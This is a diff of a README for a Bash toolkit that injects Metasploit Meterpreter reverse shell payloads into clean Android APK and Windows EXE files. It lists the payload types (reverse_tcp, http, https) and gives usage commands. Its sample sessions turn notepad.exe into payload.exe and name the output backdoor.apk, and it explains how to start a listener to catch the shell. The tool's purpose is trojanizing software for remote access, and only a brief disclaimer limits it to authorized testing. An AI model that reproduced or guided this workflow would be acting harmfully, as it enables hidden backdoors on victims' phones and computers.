@@ -1,62 +1,103 @@
-# InjKit
+Payload Injector Toolkit (APK & EXE)
 
-**Payload Injector Toolkit (APK & EXE)**
+InjKit is a lightweight Bash-based toolkit for injecting Metasploit Meterpreter reverse shell payloads into clean Android APK files or Windows EXE binaries using msfvenom.
 
-InjKit is a lightweight and interactive Bash-based toolkit for injecting **Meterpreter reverse shell payloads** into clean Android **APK** files or Windows **EXE** binaries using `msfvenom`.
+It consists of two interactive scripts:
 
-It consists of **two scripts**:
+apk_injector.sh → injects payloads into APK files (Android).
 
-- `apk_injector.sh` for injecting payloads into APK files (Android)
-- `exe_injector.sh` for injecting payloads into EXE files (Windows)
+exe_injector.sh → injects payloads into EXE files (Windows).
 
-Both scripts are designed to be simple, interactive, and efficient, and automatically generate a matching **Metasploit listener resource script (`listener.r`)** to help you catch the reverse shell with ease.
 
----
+Both scripts:
 
-## 📁 Included Scripts
+Validate LHOST and LPORT.
 
-### 1. `apk_injector.sh` — Android APK Injector
+Let you choose payload type (TCP, HTTP, HTTPS).
 
-Injects a reverse shell payload into a clean APK file using Metasploit’s `msfvenom`.
+Verify file paths before injection.
 
-#### 🔧 Features:
+Automatically generate a Metasploit listener script (listener.r).
 
-- Simple interactive interface
-- Verifies APK file path before injection
-- Detects payload settings (LHOST, LPORT)
-- Generates a new APK file with embedded payload
-- Automatically creates a **Metasploit listener script (`listener.r`)**
+
 
 ---
 
-### 2. `exe_injector.sh` — Windows EXE Injector
+📁 Included Scripts
 
-Injects a reverse shell payload into a clean Windows EXE file using Metasploit’s `msfvenom`.
+1. apk_injector.sh — Android APK Injector
 
-#### 🔧 Features:
+Injects a reverse shell payload into a clean APK.
 
-- Interactive prompts for LHOST, LPORT, and EXE path
-- Automatically detects EXE architecture (`x86` or `x64`)
-- Selects appropriate payload based on architecture
-- Generates a new EXE file with embedded payload
-- Automatically creates a **Metasploit listener script (`listener.r`)**
+🔧 Features:
+
+Interactive prompts for LHOST, LPORT, payload selection.
+
+Validates APK path and output filename.
+
+Supports payloads:
+
+android/meterpreter/reverse_tcp
+
+android/meterpreter/reverse_http
+
+android/meterpreter/reverse_https
+
+
+Generates new APK with embedded payload.
+
+Creates listener.r for Metasploit.
+
+
 
 ---
 
-#### 🚀 Example Usage:
+2. exe_injector.sh — Windows EXE Injector
 
-```bash
+Injects a reverse shell payload into a clean EXE.
+
+🔧 Features:
+
+Interactive prompts for LHOST, LPORT, payload type.
+
+Detects EXE architecture automatically (x86 or x64).
+
+Supports payloads:
+
+windows/meterpreter/reverse_{tcp,http,https}
+
+windows/x64/meterpreter/reverse_{tcp,http,https}
+
+
+Validates EXE path and output filename.
+
+Generates new EXE with embedded payload.
+
+Creates listener.r for Metasploit.
+
+
+
+---
+
+🚀 Example Usage
+
+APK Injector
+
 chmod +x apk_injector.sh
 ./apk_injector.sh
 
-🖥️ Sample Terminal Interaction:
+🖥️ Sample Interaction:
 
 ===============================
-        APK Payload Injector   
+        APK Payload Injector
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
 🎯 Enter LPORT: 4444
+Select Payload Type:
+1) android/meterpreter/reverse_tcp
+2) android/meterpreter/reverse_http
+3) android/meterpreter/reverse_https
 Enter the path to a clean APK file: /root/app.apk
 Enter the output file name (e.g., evil.apk): backdoor.apk
 
@@ -68,33 +109,34 @@ Enter the output file name (e.g., evil.apk): backdoor.apk
 
 ---
 
-2. exe_injector.sh — Windows EXE Injector
-
-Injects a reverse shell payload into a clean EXE file using Metasploit’s msfvenom.
-
----
-
-🚀 Example Usage:
+EXE Injector
 
 chmod +x exe_injector.sh
 ./exe_injector.sh
 
-🖥️ Sample Terminal Interaction:
+🖥️ Sample Interaction:
 
 ===============================
-      EXE Payload Injector     
+      EXE Payload Injector
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
 🎯 Enter LPORT: 5555
 Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe
-Enter the output file name (e.g., evil.exe): payload.exe
 
 =========================================
 ✅ Architecture detected: x64
 =========================================
 
-[*] Injecting payload into /root/notepad.exe...
+Select Payload Type (x64):
+1) windows/x64/meterpreter/reverse_tcp
+2) windows/x64/meterpreter/reverse_http
+3) windows/x64/meterpreter/reverse_https
+Enter choice [1-3]: 1
+
+Enter the output file name (e.g., evil.exe): payload.exe
+
+[*] Injecting payload (windows/x64/meterpreter/reverse_tcp) into /root/notepad.exe...
 [+] Payload injected successfully! Saved as: payload.exe
 [+] Metasploit listener script saved as: listener.r
 [*] You can run it using: msfconsole -r listener.r
@@ -104,22 +146,22 @@ Enter the output file name (e.g., evil.exe): payload.exe
 
 🎯 Listener Script (listener.r)
 
-After each successful payload injection, a file named listener.r is generated. This file contains the required Metasploit commands to handle the reverse connection.
-
-🔁 How to use it:
+Each injection generates a listener.r file with the required commands for Metasploit:
 
 msfconsole -r listener.r
+
+This automatically starts the handler for the chosen payload.
 
 
 ---
 
 ⚠️ Notes
 
-These tools depend on msfvenom, which is part of the Metasploit Framework.
+Requires Metasploit Framework installed (msfvenom, msfconsole).
 
-Ensure Metasploit is installed and that msfvenom is accessible via terminal.
+Works on Linux systems (tested on Kali).
 
-This tool is for educational and authorized penetration testing purposes only.
+For educational and authorized penetration testing only.
 
 
 
@@ -127,23 +169,8 @@ This tool is for educational and authorized penetration testing purposes only.
 
 💬 Feedback
 
-Feel free to submit issues, improvements, or suggestions.
-Made with ❤️ for learning, red teaming, and ethical hacking.
+Contributions, improvements, or suggestions are welcome.
+Made for learning, red teaming, and ethical hacking.
 
 
 ---
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
